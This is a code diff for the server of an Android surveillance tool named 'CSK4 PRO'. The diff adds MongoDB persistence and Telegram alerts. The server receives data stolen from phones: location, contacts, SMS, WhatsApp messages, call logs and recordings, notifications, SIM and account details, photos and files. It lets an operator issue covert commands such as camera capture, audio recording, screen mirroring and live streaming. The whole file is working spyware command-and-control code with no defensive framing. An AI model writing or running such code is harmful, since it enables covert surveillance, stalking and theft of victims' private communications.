@@ -4,17 +4,24 @@ const path = require('path');
 const cors = require('cors');
 const multer = require('multer');
 const bodyParser = require('body-parser');
+const compression = require('compression');
+const helmet = require('helmet');
 const { Server } = require('socket.io');
 const nodemailer = require('nodemailer');
 const fs = require('fs');
 require('dotenv').config();
+
+// 🆕 NEW IMPORTS
+const mongoDB = require('./db');
+const telegram = require('./telegram');
 
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
   cors: { origin: '*' },
   maxHttpBufferSize: 2e8,
-  pingTimeout: 60000
+  pingTimeout: 60000,
+  pingInterval: 25000
 });
 
 // ============ CONFIG ============
@@ -68,7 +75,17 @@ async function sendEmail(subject, body, attachments = []) {
   }
 }
 
+// ============ DUAL NOTIFICATION (Telegram + Email) ============
+async function notify(subject, body) {
+  // Send to Telegram (FAST)
+  telegram.sendMessage(`<b>${subject}</b>\n\n${body}`).catch(() => {});
+  // Send to Email (BACKUP)
+  sendEmail(subject, body).catch(() => {});
+}
+
 // ============ MIDDLEWARE ============
+app.use(helmet({ contentSecurityPolicy: false }));
+app.use(compression());
 app.use(cors());
 app.use(bodyParser.json({ limit: '200mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '200mb' }));
@@ -87,7 +104,7 @@ const storage = multer.diskStorage({
 });
 const upload = multer({ storage, limits: { fileSize: 200 * 1024 * 1024 } });
 
-// ============ MEMORY STORAGE ============
+// ============ IN-MEMORY CACHE (fallback) ============
 let devices = {};
 let locations = [];
 let contacts = [];
@@ -107,30 +124,88 @@ let notifications = [];
 let whatsappMessages = [];
 let activities = [];
 let callRecordings = [];
-let simInfo = {};      // 🆕
-let accountsInfo = {}; // 🆕
-let emailsInfo = {};   // 🆕
+let simInfo = {};
+let accountsInfo = {};
+let emailsInfo = {};
+
+// ============ INITIALIZE ============
+async function initialize() {
+  try {
+    // Connect to MongoDB
+    await mongoDB.connect();
+    console.log('✅ MongoDB connected');
+    
+    // Load existing data from MongoDB
+    const savedData = await mongoDB.loadAllData();
+    if (savedData) {
+      devices = savedData.devices || {};
+      locations = savedData.locations || [];
+      contacts = savedData.contacts || [];
+      files = savedData.files || [];
+      photos = savedData.photos || [];
+      videos = savedData.videos || [];
+      audioRec = savedData.audio || [];
+      messages = savedData.messages || [];
+      callLogs = savedData.callLogs || [];
+      callRecordings = savedData.callRecordings || [];
+      installedApps = savedData.apps || [];
+      screenshots = savedData.screenshots || [];
+      bluetoothDevices = savedData.bluetooth || [];
+      notifications = savedData.notifications || [];
+      whatsappMessages = savedData.whatsapp || [];
+      activities = savedData.activities || [];
+      simInfo = savedData.simInfo || {};
+      accountsInfo = savedData.accounts || {};
+      emailsInfo = savedData.emails || {};
+      commands = savedData.commands || [];
+      deviceInfo = savedData.deviceInfo || {};
+      
+      console.log(`📊 Loaded from MongoDB:`);
+      console.log(`   Devices: ${Object.keys(devices).length}`);
+      console.log(`   Contacts: ${contacts.length}`);
+      console.log(`   Messages: ${messages.length}`);
+    }
+    
+    // Initialize Telegram
+    telegram.init();
+    
+  } catch (error) {
+    console.error('❌ Initialization error:', error.message);
+  }
+}
 
 // ============ DEVICE ENDPOINTS ============
 
-app.post('/api/device/register', (req, res) => {
+app.post('/api/device/register', async (req, res) => {
   const { deviceId, deviceName, token, model, android, battery } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid token' });
-  devices[deviceId] = {
-    deviceId, deviceName: deviceName || 'Unknown',
-    model: model || deviceName, android: android || 'Unknown',
-    battery: battery || 0, lastSeen: new Date(), online: true, ip: req.ip
+  
+  const device = {
+    deviceId,
+    deviceName: deviceName || 'Unknown',
+    model: model || deviceName,
+    android: android || 'Unknown',
+    battery: battery || 0,
+    lastSeen: new Date(),
+    online: true,
+    ip: req.ip
   };
+  
+  devices[deviceId] = device;
+  
+  // 💾 Save to MongoDB
+  await mongoDB.updateOne(mongoDB.COLLECTIONS.DEVICES, { deviceId }, device);
+  
   io.emit('device-update', devices);
   console.log(`✅ ${deviceName} (${deviceId})`);
-  sendEmail(
-    `🟢 Device Online: ${deviceName}`,
-    `Device: ${deviceName}\nID: ${deviceId}\nModel: ${model}\nAndroid: ${android}\nBattery: ${battery}%\nIP: ${req.ip}\nTime: ${new Date().toLocaleString()}`
-  );
+  
+  // 🔔 Notify
+  telegram.notifyDeviceOnline(deviceName, deviceId, model, android, battery);
+  
   res.json({ success: true });
 });
 
-app.post('/api/device/heartbeat', (req, res) => {
+app.post('/api/device/heartbeat', async (req, res) => {
   const { deviceId, token, battery } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
   if (devices[deviceId]) {
@@ -142,144 +217,178 @@ app.post('/api/device/heartbeat', (req, res) => {
   res.json({ success: true });
 });
 
-app.post('/api/device/location', (req, res) => {
+app.post('/api/device/location', async (req, res) => {
   const { deviceId, lat, lng, accuracy, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  
   const entry = { deviceId, lat, lng, accuracy, time: new Date() };
   locations.push(entry);
   if (locations.length > 5000) locations.shift();
+  
+  // 💾 Save to MongoDB
+  await mongoDB.save(mongoDB.COLLECTIONS.LOCATIONS, entry);
+  
   io.emit('new-location', entry);
-  sendEmail(
-    `📍 Location Update`,
-    `Device: ${devices[deviceId]?.deviceName || deviceId}\nLatitude: ${lat}\nLongitude: ${lng}\nAccuracy: ${accuracy}m\nMaps: https://maps.google.com/?q=${lat},${lng}\nTime: ${new Date().toLocaleString()}`
-  );
+  
+  const deviceName = devices[deviceId]?.deviceName || deviceId;
+  telegram.notifyLocation(deviceName, lat, lng, accuracy);
+  sendEmail(`📍 Location Update`, `Device: ${deviceName}\nLat: ${lat}\nLng: ${lng}\nMaps: https://maps.google.com/?q=${lat},${lng}`);
+  
   res.json({ success: true });
 });
 
-app.post('/api/device/contacts', (req, res) => {
+app.post('/api/device/contacts', async (req, res) => {
   const { deviceId, contacts: list, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  
+  // Clear old and save new
   contacts = contacts.filter(c => c.deviceId !== deviceId);
-  list.forEach(c => contacts.push({ deviceId, name: c.name, phone: c.phone, type: c.type }));
+  const newContacts = list.map(c => ({ deviceId, name: c.name, phone: c.phone, type: c.type }));
+  contacts.push(...newContacts);
+  
+  // 💾 Save to MongoDB
+  await mongoDB.remove(mongoDB.COLLECTIONS.CONTACTS, { deviceId });
+  await mongoDB.saveMany(mongoDB.COLLECTIONS.CONTACTS, newContacts);
+  
   io.emit('contacts-update', contacts);
-  sendEmail(
-    `👥 Contacts Uploaded`,
-    `Device: ${devices[deviceId]?.deviceName || deviceId}\nTotal: ${list.length}\nTime: ${new Date().toLocaleString()}`
-  );
+  console.log(`👥 Contacts saved: ${list.length}`);
+  
   res.json({ success: true, count: list.length });
 });
 
-app.post('/api/device/messages', (req, res) => {
+app.post('/api/device/messages', async (req, res) => {
   const { deviceId, messages: list, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  
   messages = messages.filter(m => m.deviceId !== deviceId);
-  list.forEach(m => messages.push({ deviceId, from: m.from, body: m.body, time: m.time, type: m.type }));
+  const newMessages = list.map(m => ({ deviceId, from: m.from, body: m.body, time: m.time, type: m.type }));
+  messages.push(...newMessages);
+  
+  // 💾 Save to MongoDB
+  await mongoDB.remove(mongoDB.COLLECTIONS.MESSAGES, { deviceId });
+  await mongoDB.saveMany(mongoDB.COLLECTIONS.MESSAGES, newMessages);
+  
   io.emit('messages-update', messages);
-  const recent = list.slice(0, 5);
-  if (recent.length > 0) {
-    let body = `Device: ${devices[deviceId]?.deviceName || deviceId}\nTotal: ${list.length}\n\nRecent Messages:\n\n`;
-    recent.forEach(m => {
-      body += `📱 ${m.from}\n${m.body}\n${new Date(parseInt(m.time) || m.time).toLocaleString()}\n\n`;
-    });
-    sendEmail(`💬 SMS Uploaded (${list.length})`, body);
-  }
+  console.log(`💬 Messages saved: ${list.length}`);
+  
   res.json({ success: true });
 });
 
-app.post('/api/device/calllogs', (req, res) => {
+app.post('/api/device/calllogs', async (req, res) => {
   const { deviceId, callLogs: list, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  
   callLogs = callLogs.filter(c => c.deviceId !== deviceId);
-  list.forEach(c => callLogs.push({ deviceId, ...c }));
+  const newLogs = list.map(c => ({ deviceId, ...c }));
+  callLogs.push(...newLogs);
+  
+  await mongoDB.remove(mongoDB.COLLECTIONS.CALL_LOGS, { deviceId });
+  await mongoDB.saveMany(mongoDB.COLLECTIONS.CALL_LOGS, newLogs);
+  
   io.emit('calllogs-update', callLogs);
   res.json({ success: true });
 });
 
-app.post('/api/device/apps', (req, res) => {
+app.post('/api/device/apps', async (req, res) => {
   const { deviceId, apps, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  
   installedApps = installedApps.filter(a => a.deviceId !== deviceId);
-  apps.forEach(a => installedApps.push({ deviceId, ...a }));
+  const newApps = apps.map(a => ({ deviceId, ...a }));
+  installedApps.push(...newApps);
+  
+  await mongoDB.remove(mongoDB.COLLECTIONS.APPS, { deviceId });
+  await mongoDB.saveMany(mongoDB.COLLECTIONS.APPS, newApps);
+  
   io.emit('apps-update', installedApps);
   res.json({ success: true });
 });
 
-app.post('/api/device/nearby', (req, res) => {
+app.post('/api/device/bluetooth', async (req, res) => {
   const { deviceId, devices: list, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  nearbyDevices = nearbyDevices.filter(d => d.deviceId !== deviceId);
-  list.forEach(d => nearbyDevices.push({ deviceId, ...d }));
-  io.emit('nearby-update', nearbyDevices);
-  res.json({ success: true });
-});
-
-app.post('/api/device/bluetooth', (req, res) => {
-  const { deviceId, devices: list, token } = req.body;
-  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  
   bluetoothDevices = bluetoothDevices.filter(d => d.deviceId !== deviceId);
-  list.forEach(d => bluetoothDevices.push({ deviceId, ...d }));
+  const newDevices = list.map(d => ({ deviceId, ...d }));
+  bluetoothDevices.push(...newDevices);
+  
+  await mongoDB.remove(mongoDB.COLLECTIONS.BLUETOOTH, { deviceId });
+  await mongoDB.saveMany(mongoDB.COLLECTIONS.BLUETOOTH, newDevices);
+  
   io.emit('bluetooth-update', bluetoothDevices);
   res.json({ success: true });
 });
 
-app.post('/api/device/info', (req, res) => {
+app.post('/api/device/info', async (req, res) => {
   const { deviceId, info, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  
   deviceInfo[deviceId] = { ...info, time: new Date() };
+  await mongoDB.updateOne(mongoDB.COLLECTIONS.DEVICE_INFO, { deviceId }, { deviceId, ...info });
+  
   io.emit('info-update', deviceInfo);
   res.json({ success: true });
 });
 
 // ============ NOTIFICATIONS ============
-app.post('/api/device/notification', (req, res) => {
-  const { deviceId, package: pkg, title, text, time, token } = req.body;
+app.post('/api/device/notification', async (req, res) => {
+  const { deviceId, package: pkg, title, text, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  
   const entry = { deviceId, package: pkg, title, text, time: new Date() };
   notifications.push(entry);
   if (notifications.length > 1000) notifications.shift();
+  
+  await mongoDB.save(mongoDB.COLLECTIONS.NOTIFICATIONS, entry);
+  
   io.emit('new-notification', entry);
-  sendEmail(
-    `🔔 ${title || pkg}`,
-    `Device: ${devices[deviceId]?.deviceName || deviceId}\nApp: ${pkg}\nTitle: ${title}\nText: ${text}\nTime: ${new Date().toLocaleString()}`
-  );
+  
+  const deviceName = devices[deviceId]?.deviceName || deviceId;
+  telegram.notifyNotification(deviceName, pkg, title, text);
+  
   res.json({ success: true });
 });
 
 // ============ WHATSAPP ============
-app.post('/api/device/whatsapp', (req, res) => {
-  const { deviceId, from, message, time, token } = req.body;
+app.post('/api/device/whatsapp', async (req, res) => {
+  const { deviceId, from, message, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  
   const entry = { deviceId, from, message, time: new Date() };
   whatsappMessages.push(entry);
   if (whatsappMessages.length > 1000) whatsappMessages.shift();
+  
+  await mongoDB.save(mongoDB.COLLECTIONS.WHATSAPP, entry);
+  
   io.emit('whatsapp-update', whatsappMessages);
-  sendEmail(
-    `💬 WhatsApp: ${from}`,
-    `Device: ${devices[deviceId]?.deviceName || deviceId}\nFrom: ${from}\nMessage: ${message}\nTime: ${new Date().toLocaleString()}`
-  );
+  
+  const deviceName = devices[deviceId]?.deviceName || deviceId;
+  telegram.notifyWhatsApp(deviceName, from, message);
+  
   res.json({ success: true });
 });
 
 // ============ ACTIVITIES ============
-app.post('/api/device/activity', (req, res) => {
-  const { deviceId, type, data, time, token } = req.body;
+app.post('/api/device/activity', async (req, res) => {
+  const { deviceId, type, data, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  
   const entry = { deviceId, type, data, time: new Date() };
   activities.push(entry);
   if (activities.length > 2000) activities.shift();
+  
+  await mongoDB.save(mongoDB.COLLECTIONS.ACTIVITIES, entry);
+  
   io.emit('activity-update', activities);
-  sendEmail(
-    `📊 Activity: ${type}`,
-    `Device: ${devices[deviceId]?.deviceName || deviceId}\nType: ${type}\nData: ${JSON.stringify(data)}\nTime: ${new Date().toLocaleString()}`
-  );
   res.json({ success: true });
 });
 
 // ============ CALL RECORDING ============
-app.post('/api/device/callrecording', upload.single('file'), (req, res) => {
+app.post('/api/device/callrecording', upload.single('file'), async (req, res) => {
   const { deviceId, number, duration, type, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
   if (!req.file) return res.status(400).json({ error: 'No file' });
+  
   const entry = {
     deviceId, number, duration, type,
     filename: req.file.filename,
@@ -287,104 +396,128 @@ app.post('/api/device/callrecording', upload.single('file'), (req, res) => {
     time: new Date()
   };
   callRecordings.push(entry);
+  
+  await mongoDB.save(mongoDB.COLLECTIONS.CALL_RECORDINGS, entry);
+  
   io.emit('callrecording-update', callRecordings);
-  sendEmail(
-    `📞 Call Recording: ${number}`,
-    `Device: ${devices[deviceId]?.deviceName || deviceId}\nNumber: ${number}\nType: ${type}\nDuration: ${duration}s\nTime: ${new Date().toLocaleString()}`,
-    [{ filename: `call-${number}-${Date.now()}.m4a`, path: `./uploads/${req.file.filename}` }]
-  );
+  
+  const deviceName = devices[deviceId]?.deviceName || deviceId;
+  telegram.notifyCallRecording(deviceName, number, duration, entry.url);
+  
   res.json({ success: true });
 });
 
-// ============ 🆕 SIM INFO ============
-app.post('/api/device/siminfo', (req, res) => {
+// ============ SIM INFO ============
+app.post('/api/device/siminfo', async (req, res) => {
   const { deviceId, sims, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  
   const entry = { deviceId, sims, time: new Date() };
   simInfo[deviceId] = entry;
+  
+  await mongoDB.updateOne(mongoDB.COLLECTIONS.SIM_INFO, { deviceId }, entry);
+  
   io.emit('siminfo-update', simInfo);
-  let simText = '';
-  if (sims && sims.length > 0) {
-    sims.forEach((sim) => {
-      simText += `SIM ${sim.slot}:\n  Number: ${sim.number || 'N/A'}\n  Operator: ${sim.operator || 'N/A'}\n  Country: ${sim.country || 'N/A'}\n  Network: ${sim.networkType || 'N/A'}\n  State: ${sim.state || 'N/A'}\n\n`;
-    });
-  }
-  sendEmail(
-    `📱 SIM Info: ${devices[deviceId]?.deviceName || deviceId}`,
-    `Device: ${devices[deviceId]?.deviceName || deviceId}\n\n${simText}\nTime: ${new Date().toLocaleString()}`
-  );
-  console.log(`📱 SIM info received from ${deviceId}`);
+  
+  const deviceName = devices[deviceId]?.deviceName || deviceId;
+  telegram.notifySimInfo(deviceName, sims);
+  
   res.json({ success: true });
 });
 
-// ============ 🆕 ACCOUNTS ============
-app.post('/api/device/accounts', (req, res) => {
+// ============ ACCOUNTS ============
+app.post('/api/device/accounts', async (req, res) => {
   const { deviceId, accounts, total, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  
   const entry = { deviceId, accounts, total, time: new Date() };
   accountsInfo[deviceId] = entry;
+  
+  await mongoDB.updateOne(mongoDB.COLLECTIONS.ACCOUNTS, { deviceId }, entry);
+  
   io.emit('accounts-update', accountsInfo);
-  let accText = `Total: ${total}\n\n`;
-  if (accounts && accounts.length > 0) {
-    accounts.forEach(acc => { accText += `📧 ${acc.name}\n   Type: ${acc.type}\n\n`; });
-  }
-  sendEmail(
-    `👤 Accounts: ${total}`,
-    `Device: ${devices[deviceId]?.deviceName || deviceId}\n\n${accText}\nTime: ${new Date().toLocaleString()}`
-  );
-  console.log(`👤 Accounts received: ${total}`);
+  
+  const deviceName = devices[deviceId]?.deviceName || deviceId;
+  telegram.notifyAccounts(deviceName, accounts);
+  
   res.json({ success: true });
 });
 
-// ============ 🆕 EMAIL ACCOUNTS ============
-app.post('/api/device/emails', (req, res) => {
+// ============ EMAILS ============
+app.post('/api/device/emails', async (req, res) => {
   const { deviceId, emails, total, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
+  
   const entry = { deviceId, emails, total, time: new Date() };
   emailsInfo[deviceId] = entry;
+  
+  await mongoDB.updateOne(mongoDB.COLLECTIONS.EMAILS, { deviceId }, entry);
+  
   io.emit('emails-update', emailsInfo);
-  let emailText = `Total: ${total}\n\n`;
-  if (emails && emails.length > 0) {
-    emails.forEach(email => { emailText += `📧 ${email}\n`; });
-  }
-  sendEmail(
-    `📧 Email Accounts: ${total}`,
-    `Device: ${devices[deviceId]?.deviceName || deviceId}\n\n${emailText}\nTime: ${new Date().toLocaleString()}`
-  );
-  console.log(`📧 Emails received: ${total}`);
+  
+  const deviceName = devices[deviceId]?.deviceName || deviceId;
+  telegram.notifyEmails(deviceName, emails);
+  
   res.json({ success: true });
 });
 
-app.post('/api/device/upload', upload.single('file'), (req, res) => {
+// ============ FILE UPLOAD ============
+app.post('/api/device/upload', upload.single('file'), async (req, res) => {
   const { deviceId, type, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
   if (!req.file) return res.status(400).json({ error: 'No file' });
+  
   const entry = {
-    deviceId, type: type || 'file',
+    deviceId,
+    type: type || 'file',
     filename: req.file.filename,
     originalName: req.file.originalname,
     url: `/uploads/${req.file.filename}`,
-    size: req.file.size, time: new Date()
+    size: req.file.size,
+    time: new Date()
   };
-  if (type === 'photo') photos.push(entry);
-  else if (type === 'video') videos.push(entry);
-  else if (type === 'audio') audioRec.push(entry);
-  else if (type === 'screenshot') screenshots.push(entry);
-  else files.push(entry);
+  
+  const deviceName = devices[deviceId]?.deviceName || deviceId;
+  
+  if (type === 'photo') {
+    photos.push(entry);
+    await mongoDB.save(mongoDB.COLLECTIONS.PHOTOS, entry);
+    telegram.notifyPhoto(deviceName, entry.url);
+  } else if (type === 'video') {
+    videos.push(entry);
+    await mongoDB.save(mongoDB.COLLECTIONS.VIDEOS, entry);
+    telegram.notifyVideo(deviceName, entry.url);
+  } else if (type === 'audio') {
+    audioRec.push(entry);
+    await mongoDB.save(mongoDB.COLLECTIONS.AUDIO, entry);
+    telegram.notifyAudio(deviceName, entry.url);
+  } else if (type === 'screenshot') {
+    screenshots.push(entry);
+    await mongoDB.save(mongoDB.COLLECTIONS.SCREENSHOTS, entry);
+    telegram.notifyPhoto(deviceName, entry.url);
+  } else {
+    files.push(entry);
+    await mongoDB.save(mongoDB.COLLECTIONS.FILES, entry);
+  }
+  
   io.emit('new-file', entry);
-  console.log(`📁 ${type}: ${entry.originalName}`);
   res.json({ success: true, file: entry });
 });
 
+// ============ COMMANDS ============
 app.get('/api/device/commands/:deviceId', (req, res) => {
   const pending = commands.filter(c => c.deviceId === req.params.deviceId && c.status === 'pending');
   res.json({ commands: pending });
 });
 
-app.post('/api/device/command-done', (req, res) => {
+app.post('/api/device/command-done', async (req, res) => {
   const { commandId, result } = req.body;
   const cmd = commands.find(c => c.id === commandId);
-  if (cmd) { cmd.status = 'done'; cmd.result = result; }
+  if (cmd) {
+    cmd.status = 'done';
+    cmd.result = result;
+    await mongoDB.updateOne(mongoDB.COLLECTIONS.COMMANDS, { id: commandId }, { status: 'done', result });
+  }
   res.json({ success: true });
 });
 
@@ -399,45 +532,46 @@ app.post('/api/admin/login', (req, res) => {
   }
 });
 
-app.get('/api/admin/data', (req, res) => {
+app.get('/api/admin/data', async (req, res) => {
+  const stats = {
+    totalDevices: Object.keys(devices).length,
+    onlineDevices: Object.values(devices).filter(d => d.online).length,
+    totalPhotos: photos.length,
+    totalVideos: videos.length,
+    totalFiles: files.length,
+    totalContacts: contacts.length,
+    totalLocations: locations.length,
+    totalMessages: messages.length,
+    totalApps: installedApps.length,
+    totalBluetooth: bluetoothDevices.length,
+    totalScreenshots: screenshots.length,
+    totalNotifications: notifications.length,
+    totalWhatsapp: whatsappMessages.length,
+    totalActivities: activities.length,
+    totalCallRecordings: callRecordings.length,
+    totalSims: Object.keys(simInfo).length,
+    totalAccounts: Object.values(accountsInfo).reduce((s, a) => s + (a.total || 0), 0),
+    totalEmails: Object.values(emailsInfo).reduce((s, e) => s + (e.total || 0), 0)
+  };
+  
   res.json({
     devices, locations, contacts, files, photos, videos,
     audio: audioRec, nearby: nearbyDevices, bluetooth: bluetoothDevices,
     messages, callLogs, apps: installedApps, deviceInfo, commands, screenshots,
     notifications, whatsapp: whatsappMessages, activities, callRecordings,
-    simInfo, accounts: accountsInfo, emails: emailsInfo,  // 🆕
-    stats: {
-      totalDevices: Object.keys(devices).length,
-      onlineDevices: Object.values(devices).filter(d => d.online).length,
-      totalPhotos: photos.length,
-      totalVideos: videos.length,
-      totalFiles: files.length,
-      totalContacts: contacts.length,
-      totalLocations: locations.length,
-      totalMessages: messages.length,
-      totalApps: installedApps.length,
-      totalBluetooth: bluetoothDevices.length,
-      totalScreenshots: screenshots.length,
-      totalNotifications: notifications.length,
-      totalWhatsapp: whatsappMessages.length,
-      totalActivities: activities.length,
-      totalCallRecordings: callRecordings.length,
-      totalSims: Object.keys(simInfo).length,                                     // 🆕
-      totalAccounts: Object.values(accountsInfo).reduce((s, a) => s + (a.total || 0), 0),  // 🆕
-      totalEmails: Object.values(emailsInfo).reduce((s, e) => s + (e.total || 0), 0)       // 🆕
-    }
+    simInfo, accounts: accountsInfo, emails: emailsInfo,
+    stats
   });
 });
 
-app.post('/api/admin/command', (req, res) => {
+app.post('/api/admin/command', async (req, res) => {
   const { deviceId, command, params } = req.body;
   const validCommands = [
-    'take_photo_front', 'take_photo_back',
-    'record_video_front', 'record_video_back',
+    'take_photo_front', 'take_photo_back', 'record_video_front', 'record_video_back',
     'record_audio', 'screenshot', 'lock_screen',
     'get_location', 'get_contacts', 'get_messages', 'get_calllogs',
     'get_files', 'get_apps', 'get_nearby', 'get_bluetooth', 'get_info',
-    'get_sim_info', 'get_accounts', 'get_email_accounts',  // 🆕
+    'get_sim_info', 'get_accounts', 'get_email_accounts',
     'vibrate', 'play_sound', 'flashlight_on', 'flashlight_off',
     'start_webrtc', 'start_audio_stream', 'stop_webrtc', 'switch_camera',
     'start_screen_mirror', 'stop_screen_mirror',
@@ -448,56 +582,68 @@ app.post('/api/admin/command', (req, res) => {
     'start_call_recording', 'stop_call_recording'
   ];
   if (!validCommands.includes(command)) return res.status(400).json({ error: 'Invalid command' });
-
+  
   const cmd = {
     id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
     deviceId, command, params: params || {},
     time: new Date(), status: 'pending'
   };
   commands.push(cmd);
+  
+  await mongoDB.save(mongoDB.COLLECTIONS.COMMANDS, cmd);
+  
   io.to(deviceId).emit('command', cmd);
   console.log(`🎮 ${command} → ${deviceId}`);
   res.json({ success: true, command: cmd });
 });
 
-app.delete('/api/admin/device/:deviceId', (req, res) => {
+app.delete('/api/admin/device/:deviceId', async (req, res) => {
   const id = req.params.deviceId;
   delete devices[id];
-  [locations, contacts, files, photos, videos, audioRec, messages,
-   callLogs, installedApps, screenshots, bluetoothDevices,
-   notifications, whatsappMessages, activities].forEach(arr => {
-    for (let i = arr.length - 1; i >= 0; i--) if (arr[i].deviceId === id) arr.splice(i, 1);
-  });
   delete simInfo[id];
   delete accountsInfo[id];
   delete emailsInfo[id];
+  
+  await mongoDB.remove(mongoDB.COLLECTIONS.DEVICES, { deviceId: id });
+  await mongoDB.remove(mongoDB.COLLECTIONS.LOCATIONS, { deviceId: id });
+  await mongoDB.remove(mongoDB.COLLECTIONS.CONTACTS, { deviceId: id });
+  await mongoDB.remove(mongoDB.COLLECTIONS.MESSAGES, { deviceId: id });
+  
   io.emit('device-update', devices);
-  res.json({ success: true });
-});
-
-app.delete('/api/admin/clear-commands/:deviceId', (req, res) => {
-  commands = commands.filter(c => c.deviceId !== req.params.deviceId);
   res.json({ success: true });
 });
 
 // ============ SOCKET.IO ============
 io.on('connection', (socket) => {
   console.log('🔌', socket.id);
-  socket.on('register-device', (id) => { socket.join(id); console.log('📱 Device:', id); });
-  socket.on('register-admin', () => { socket.join('admin-room'); console.log('👤 Admin'); });
+  
+  socket.on('register-device', (id) => {
+    socket.join(id);
+    console.log('📱 Device:', id);
+  });
+  
+  socket.on('register-admin', () => {
+    socket.join('admin-room');
+    console.log('👤 Admin');
+  });
+  
   socket.on('webrtc-offer', (data) => io.to(data.target).emit('webrtc-offer', data));
   socket.on('webrtc-answer', (data) => io.to(data.target).emit('webrtc-answer', data));
   socket.on('webrtc-ice', (data) => io.to(data.target).emit('webrtc-ice', data));
   socket.on('screen-mirror-offer', (data) => io.to(data.target).emit('screen-mirror-offer', data));
   socket.on('screen-mirror-answer', (data) => io.to(data.target).emit('screen-mirror-answer', data));
   socket.on('screen-mirror-ice', (data) => io.to(data.target).emit('screen-mirror-ice', data));
+  
   socket.on('disconnect', () => console.log('❌', socket.id));
 });
 
 // ============ START ============
-server.listen(CONFIG.PORT, '0.0.0.0', () => {
-  console.log(`🚀 CSK4 PRO Server v3.0 running on port ${CONFIG.PORT}`);
-  console.log(`   Admin Panel: http://localhost:${CONFIG.PORT}/`);
-  console.log(`   Email: ${CONFIG.ENABLE_EMAIL ? '✅ Enabled' : '❌ Disabled'}`);
-  console.log(`   Email To: ${CONFIG.EMAIL_TO || 'Not set'}`);
+initialize().then(() => {
+  server.listen(CONFIG.PORT, '0.0.0.0', () => {
+    console.log(`🚀 CSK4 PRO v4.0 running on port ${CONFIG.PORT}`);
+    console.log(`   Admin Panel: http://localhost:${CONFIG.PORT}/`);
+    console.log(`   Email: ${CONFIG.ENABLE_EMAIL ? '✅' : '❌'}`);
+    console.log(`   MongoDB: ${mongoDB.isConnected() ? '✅' : '❌'}`);
+    console.log(`   Telegram: ${telegram.getStatus().enabled ? '✅' : '❌'}`);
+  });
 });
